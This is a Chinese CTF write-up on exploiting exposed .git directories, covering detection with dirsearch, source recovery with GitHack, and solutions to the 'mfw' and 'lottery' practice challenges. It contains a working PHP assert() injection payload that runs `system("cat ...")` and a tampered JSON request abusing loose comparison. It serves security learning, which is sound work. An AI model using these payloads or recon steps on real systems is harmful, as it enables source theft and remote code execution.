全文参考link  
https://www.cnblogs.com/linfangnan/p/13600490.html#%E4%BE%8B%E9%A2%98%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-mfw
#目录#
- Git
- 源码泄露
- 确定是否存在泄漏
- 获取泄露的源码
- 例题：攻防世界-lottery
- 例题：攻防世界-mfw
- 例题：JMUCTF-leak_snake
#Git 源码泄露#
开发人员会使用 git 进行版本控制，对站点自动部署。但如果配置不当，可能会将 .git 文件夹直接部署到线上环境，这就引起了 git 泄露漏洞，我们可以利用这个漏洞直接获得网页源码。
![](https://img2020.cnblogs.com/blog/1774310/202009/1774310-20200903092828683-738183607.png)
#确定是否存在泄漏#
想要确定是否存在这个漏洞，可以通过以下方式。首先是看看有没有提示醒目地指出 Git，如果有就考虑存在。如果没有也可以使用 dirsearch 工具扫描后台，如果存在则会扫描出 .git 目录如图所示。

当然也可以直接通过网页访问 .git 目录，如果能访问就说明存在。
![](https://img2020.cnblogs.com/blog/1774310/202009/1774310-20200902111806216-767273290.png)
也可以试着访问 .git/head 文件，如果能下载也能推断存在 Git 源码泄露。
![](https://img2020.cnblogs.com/blog/1774310/202009/1774310-20200902112040701-1263212087.png)

#获取泄露的源码#
要获取泄露的源码，可以使用 GitHack 工具，下载地址。GitHack 是一个 .git 泄露利用脚本，通过泄露的 .git 文件夹下的文件重建还原工程源代码。在 cmd 命令下键入下面的命令，脚本就会把存在 Git 泄露的源码全部下载下来。
    GitHack.py <url>
![](https://img2020.cnblogs.com/blog/1774310/202009/1774310-20200902112354245-358955868.png)

#例题：攻防世界-mfw#
获取源码后，打开 index.php 文件得到题目的源码，源码会接收一个 page 参数。

    <?php
    
    if (isset($_GET['page'])) {
    	$page = $_GET['page'];
    } 
    else {
    	$page = "home";
    }
    
    $file = "templates/" . $page . ".php";
    
    // I heard '..' is dangerous!
    assert("strpos('$file', '..') === false") or die("Detected hacking attempt!");
    
    // TODO: Make this look nice
    assert("file_exists('$file')") or die("That file doesn't exist!");
    
    ?>

输出 flag 要满足以下 2 句代码，注意到第二句代码是个 assert() 断言，它可以将参数作为代码来执行。

    $file = "templates/" . $page . ".php";
    assert("strpos('$file', '..') === false")

因此我们考虑让断言执行 cat 命令，直接回显目录下的 flag.php 文件，这样就能看到其中的内容了。构造出的 payload 如下，上传得到 flag。

    ?page=abc') or system("cat templates/flag.php");//

这个参数和上述的 file 变量替换，等同于执行了以下代码。首先因为网页不存在 abc 页面，所以使用 strpos() 函数会返回 false，因此代码会执行 or 后面的 system() 函数。最后认为添加个注释，让后面的代码不要执行。

    assert("strpos('templates/?page=abc') or system("cat templates/flag.php");//.php', '..') === false")

##这里存在疑问：##
语句执行system的时候，和assert语句中")怎么对应，感觉少了")

#第二题#
#攻防世界-lottery#
表面上看上去是要中了大奖，然后买flag

1. 用御剑扫描网站，发现有robots.txt

里面内容是:

    User-agent: *
    Disallow: /.git/
猜测是git源码泄露

2. 观察api.php中函数，发现

       for($i=0; $i<7; $i++){
    		
           if($numbers[$i] == $win_numbers[$i]){
    			$same_count++;
    		}
    其中我们看到 numbers 这个变量是我们能操作的，函数会以数组的形式提取每位数字。同时这个变量在和随机生成的 win_numbers 变量比较时使用的是 “==”，也就是说可以用弱类型来绕过。
3. 由于随机变量是数字，因此我们可以使用 true 来满足比较，但是我们显然不能在输入框输入 7 个 “true”。因此我们考虑修改数据包，通过抓包发现数据的传输是通过传一个映射来上传的。
4. 顶顶顶

    POST /api.php HTTP/1.1
    Host: 111.200.241.244:52260
    Content-Length: 36
    Accept: application/json, text/javascript, */*; q=0.01
    X-Requested-With: XMLHttpRequest
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36
    Content-Type: application/json
    Origin: http://111.200.241.244:52260
    Referer: http://111.200.241.244:52260/buy.php
    Accept-Encoding: gzip, deflate
    Accept-Language: en-US,en;q=0.9
    Cookie: PHPSESSID=41d2992c7047d7d1ba61ab0e3a6402d6
    Connection: close
    
    {"action":"buy","numbers":"1111111"}

改为
    `{"action":"buy","numbers":[true,true,true,true,true,true,true]}`

5. 其中 $numbers 来自用户json输入 {"action":"buy","numbers":"1122334"}，没有检查数据类型。 $win_numbers 是随机生成的数字字符串。
使用 PHP 弱类型松散比较，以"1"为例，和TRUE,1,"1"相等。 由于 json 支持布尔型数据，因此可以抓包改包，

当**每一位中奖号码都不是0时**即可中最高奖，攒钱买flag。

